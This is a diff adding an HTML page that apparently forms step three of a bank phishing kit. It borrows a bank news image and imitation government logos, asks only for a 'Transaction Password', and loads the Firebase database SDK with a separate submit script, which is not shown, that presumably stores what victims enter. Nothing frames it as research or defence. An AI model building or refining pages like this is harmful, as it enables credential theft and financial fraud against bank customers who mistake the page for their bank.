@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>most requeated pagesss</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #ffffff;
+    }
+
+    .top-image {
+      width: 100%;
+      height: auto;
+      margin-top: 20px;
+      margin-bottom: 20px;
+    }
+
+    .form-box {
+      width: 92%;
+      max-width: 400px;
+      margin: 0 auto 20px auto;
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      padding: 25px;
+    }
+
+    label {
+      display: block;
+      font-weight: bold;
+      font-size: 14px;
+      margin-bottom: 5px;
+      text-align: left;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      margin-bottom: 18px;
+      border: none;
+      border-bottom: 2px solid #e53935;
+      background-color: transparent;
+      color: #333;
+    }
+
+    input::placeholder {
+      color: #aaa;
+    }
+
+    .submit-btn {
+      width: 100%;
+      background-color: #d00000;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      padding: 14px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .submit-btn:hover {
+      background-color: #b00000;
+    }
+
+    .footer-logos {
+      display: flex;
+      justify-content: center;
+      gap: 30px;
+      margin-top: 30px;
+      padding-bottom: 30px;
+    }
+
+    .footer-logos img {
+      height: 35px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Top Image -->
+  <img src="https://media.fortuneindia.com/fortune-india/import/2022-05/0e3769c0-6456-4a93-bf42-175ecea786d5/SFB_lead.jpg?w=640&auto=format,compress&fit=max&q=70" alt="Bank Image" class="top-image" />
+
+  <!-- Form Box -->
+  <div class="form-box">
+    <form id="ududip007">
+      <label for="tpass">Transaction Password</label>
+      <input type="password" id="tpass" placeholder="Transaction Password" required />
+      <button type="submit" class="submit-btn">Submit</button>
+    </form>
+  </div>
+
+  <!-- Footer Logos -->
+  <div class="footer-logos">
+    <img src="1d.png" alt="Digndia" />
+    <img src="2n.png" alt="assw" />
+  </div>
+
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+  <!-- Firebase Config -->
+  <script src="firebase-config.js"></script>
+
+  <!-- Submit Script -->
+  <script src="step3-script.js"></script>
+</body>
+</html>
